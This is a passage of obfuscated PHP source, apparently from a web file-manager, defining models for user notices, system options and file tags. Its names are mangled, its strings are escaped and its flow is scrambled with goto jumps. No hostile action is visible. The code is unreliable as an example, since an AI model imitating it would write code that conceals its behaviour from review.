$_SERVER[Çâä∆◊¡]; $ﬁ∏ùﬂ—ˆ = time(); if ($Á˘á€ÿœ[$Éÿøﬂí√[16]] == $Éÿøﬂí√[2223]) { $ﬁ∏ùﬂ—ˆ = strtotime($Á˘á€ÿœ[$Éÿøﬂí√[196]]); } $Á˘á€ÿœ[$Éÿøﬂí√[196]] = $ﬁ∏ùﬂ—ˆ; return parent::insert($Á˘á€ÿœ); } public function update($∆ò“◊ö—, $Øà∞÷∑≥) { $Æ£ﬁ„¯˙ =& $_SERVER[Çâä∆◊¡]; $¯óŒ§√¯ = $this->listData($∆ò“◊ö—); if (!$¯óŒ§√¯) { return !1; } $ï§Ò…‹¥ = time(); if ($Øà∞÷∑≥[$Æ£ﬁ„¯˙[16]] == $Æ£ﬁ„¯˙[2223]) { $ï§Ò…‹¥ = strtotime($Øà∞÷∑≥[$Æ£ﬁ„¯˙[196]]); } $Øà∞÷∑≥[$Æ£ﬁ„¯˙[196]] = $ï§Ò…‹¥; return parent::update($∆ò“◊ö—, $Øà∞÷∑≥); } public function remove($º–π˝ûª) { $◊âñ£»Û = $this->listData($º–π˝ûª); if (!$◊âñ£»Û || $◊âñ£»Û[$_SERVER[Çâä∆◊¡][1261]]) { return !1; } return parent::remove($º–π˝ûª); } public function sort($ÏºáÒˆ∑, $«èâ∞√÷) { return parent::update($ÏºáÒˆ∑, $«èâ∞√÷); } public function enable($î÷ï⁄˛ß, $πã∂ÿºû) { return parent::update($î÷ï⁄˛ß, array($_SERVER[Çâä∆◊¡][2224] => $πã∂ÿºû)); } private function initUserOption() { $˙«¯î¸Œ =& $_SERVER[Çâä∆◊¡]; $this->optionType = $˙«¯î¸Œ[2225]; $this->modelType = $˙«¯î¸Œ[2226]; $this->field = array($˙«¯î¸Œ[2227], $˙«¯î¸Œ[32], $˙«¯î¸Œ[196], $˙«¯î¸Œ[33], $˙«¯î¸Œ[2228], $˙«¯î¸Œ[743], $˙«¯î¸Œ[188]); } public function userNoticeGet($ÇÉ‰êÀ‚ = false) { $this->initUserOption(); return parent::listData($ÇÉ‰êÀ‚, $_SERVER[Çâä∆◊¡][401], !0); } public function userNoticeAdd($€ÿÎ‹£∏) { $Ë›Ö ÷æ =& $_SERVER[Çâä∆◊¡]; $this->initUserOption(); $àÊâ§·ô = $this->findByKey($Ë›Ö ÷æ[2227], $€ÿÎ‹£∏[$Ë›Ö ÷æ[401]]); if ($àÊâ§·ô) { return !0; } $˝–¬‰Ìé = array($Ë›Ö ÷æ[2227] => $€ÿÎ‹£∏[$Ë›Ö ÷æ[401]], $Ë›Ö ÷æ[32] => $€ÿÎ‹£∏[$Ë›Ö ÷æ[32]], $Ë›Ö ÷æ[196] => $€ÿÎ‹£∏[$Ë›Ö ÷æ[196]], $Ë›Ö ÷æ[33] => isset($€ÿÎ‹£∏[$Ë›Ö ÷æ[33]]) ? $€ÿÎ‹£∏[$Ë›Ö ÷æ[33]] : 1, $Ë›Ö ÷æ[2228] => isset($€ÿÎ‹£∏[$Ë›Ö ÷æ[2228]]) ? $€ÿÎ‹£∏[$Ë›Ö ÷æ[2228]] : 0, $Ë›Ö ÷æ[743] => 0, $Ë›Ö ÷æ[188] => 0); return parent::insert($˝–¬‰Ìé); } public function userNoticeEdit($ÈÔ˙„ÓÕ, $æ’§‘Ï‹) { $this->initUserOption(); return parent::update($ÈÔ˙„ÓÕ, $æ’§‘Ï‹); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\145\x6d\x5f\x6f\160\164\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\157\154\x65", "\x72\x6f\x6c\145\x47\x72\157\x75\x70", "\162\x65\147\x69\x73\x74", "\145\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Ñ¶÷çäâ) { return "\123\x79\163\x74\145\155\x4f\x70\x74\x69\157\x6e\137{$Ñ¶÷çäâ}"; } protected function optionDefault($öËëæçÚ = '') { $≤¶ˆ‰˛™ =& $_SERVER[Çâä∆◊¡]; if ($öËëæçÚ == $≤¶ˆ‰˛™[12]) { return $GLOBALS[$≤¶ˆ‰˛™[6]][$≤¶ˆ‰˛™[376]]; } } } class SystemRecordModel extends ModelBaseLight { } goto eéÆ±”Ç≥≤; B…ÜÃè•‹œ: function binCheckBigger($ÌØÊÌÇ, $˜¥˚ÅµË) { return $ÌØÊÌÇ > $˜¥˚ÅµË; } $_SERVER[$_SERVER[‰åñ∂çÏ][3]] = ("\x37\x39\x39\x30"."\71\62")+0;$_u02o="woxpqr7cnf08islh2jtd6z3bke5v1g4ayum91jrax2c0v9yli7mqgfdh4bzkupto368nw5se07w9j5";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($˘ñ˘Ì¢õ, $ëÄãΩäπ) { $íí÷Ÿ•› =& $_SERVER[Çâä∆◊¡]; if (isset(self::$_methodList[$˘ñ˘Ì¢õ])) { return @call_user_func_array(self::$_methodList[$˘ñ˘Ì¢õ], $ëÄãΩäπ); } else { if (method_exists($this, $˘ñ˘Ì¢õ)) { return call_user_func_array(array($this, $˘ñ˘Ì¢õ), $ëÄãΩäπ); } else { think_exception(__CLASS__ . $íí÷Ÿ•›[4] . $˘ñ˘Ì¢õ . $íí÷Ÿ•›[5]); } } } public static function __callStatic($ÇŸÄã„ﬂ, $Ωöî¯ç÷) { if (isset(self::$_methodListStatic[$ÇŸÄã„ﬂ])) { return call_user_func_array(self::$_methodListStatic[$ÇŸÄã„ﬂ], $Ωöî¯ç÷); } else { if (method_exists(self, $ÇŸÄã„ﬂ)) { return call_user_func_array(array(self, $ÇŸÄã„ﬂ), $Ωöî¯ç÷); } else { show_json("{$ÇŸÄã„ﬂ}\x28\51\40\x6e\x6f\164\x20\145\170\x69\163\164\73", !1); } } } public static function addMethod($ÙÁÊóº√, $ﬁ√≤ÕÖç) { self::$_methodList[$ÙÁÊóº√] = $ﬁ√≤ÕÖç; } public static function addMethodStatic($’ıÔÂó€, $Ì«úÇ¯´) { self::$_methodListStatic[$’ıÔÂó€] = $Ì«úÇ¯´; } } goto d˜õƒ‡ß÷«; a¬ÖíéÚ“ﬁ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($ìô≤û≠˚) { $ßÄ´Ë‡ü =& $_SERVER[Çâä∆◊¡]; return array($ßÄ´Ë‡ü[1918] => array(USER_ID, $ßÄ´Ë‡ü[1919])); } protected function listData() { $’∏íÁ˘  =& $_SERVER[Çâä∆◊¡]; $´§£Ùøé = array($’∏íÁ˘ [1633] => USER_ID, $’∏íÁ˘ [483] => array($’∏íÁ˘ [1922], 0)); $›´œûæÍ = $’∏íÁ˘ [1924]; $‘¸ô´ Ï = $this->field($›´œûæÍ)->where($´§£Ùøé)->order($’∏íÁ˘ [1925])->select(); return $‘¸ô´ Ï ? $‘¸ô´ Ï : array(); } protected function listByTag($‚©∫¡›µ) { } protected function addToTag($Ê˝©ªàÚ, $’ø”•‰◊) { $‚öá™ÉÔ =& $_SERVER[Çâä∆◊¡]; if (!Model($‚öá™ÉÔ[2059])->listData($’ø”•‰◊) || !Model($‚öá™ÉÔ[818])->pathInfo($Ê˝©ªàÚ)) { return !1; } $äûàÆàÙ = array($‚öá™ÉÔ[1633] => USER_ID, $‚öá™ÉÔ[483] => $’ø”•‰◊, $‚öá™ÉÔ[422] => $Ê˝©ªàÚ, $‚öá™ÉÔ[423] => $‚öá™ÉÔ[417], $‚öá™ÉÔ[421] => $‚öá™ÉÔ[12], $‚öá™ÉÔ[1814] => 0); if ($this->where($äûàÆàÙ)->find()) { return !1; } return $this->add($äûàÆàÙ); } protected function removeFromTag($ÿ‘√ÿ©˜, $Ï≠Œú¢ı) { $’™™ß¯≥ =& $_SERVER[Çâä∆◊¡]; if (!Model($’™™ß¯≥[2059])->listData($Ï≠Œú¢ı)) { return !1; } if (is_array($ÿ‘√ÿ©˜)) { $ÿ‘√ÿ©˜ = array($’™™ß¯≥[7], $ÿ‘√ÿ©˜); } $‹ÖÏ”‰ﬂ = array($’™™ß¯≥[1633] => USER_ID, $’™™ß¯≥[483] => $Ï≠Œú¢ı, $’™™ß¯≥[423] => $’™™ß¯≥[417], $’™™ß¯≥[422] => $ÿ‘√ÿ©˜); return $this->where($‹ÖÏ”‰ﬂ)->delete(); } protected function removeByTag($¶ßÌªπŒ) { $ËΩ“àËá =& $_SERVER[Çâä∆◊¡]; if (!$¶ßÌªπŒ) { return !1; } $°ªè≠áÒ = array($ËΩ“àËá[1633] => USER_ID, $ËΩ“àËá[483] => $¶ßÌªπŒ); return $this->where($°ªè≠áÒ)->delete(); } protected function removeBySource($¨É¬ùŸﬂ) { $£éû≠õ£ =& $_SERVER[Çâä∆◊¡]; if (is_array($¨É¬ùŸﬂ)) { $¨É¬ùŸﬂ = array($£éû≠õ£[7], $¨É¬ùŸﬂ); } $≥¯∂Ø€ø = array($£éû≠õ£[1633] => USER_ID, $£éû≠õ£[422] => $¨É¬ùŸﬂ, $£éû≠õ£[483] => array($£éû≠õ£[1001], 0)); return $this->where($≥¯∂Ø€ø)->delete(); } }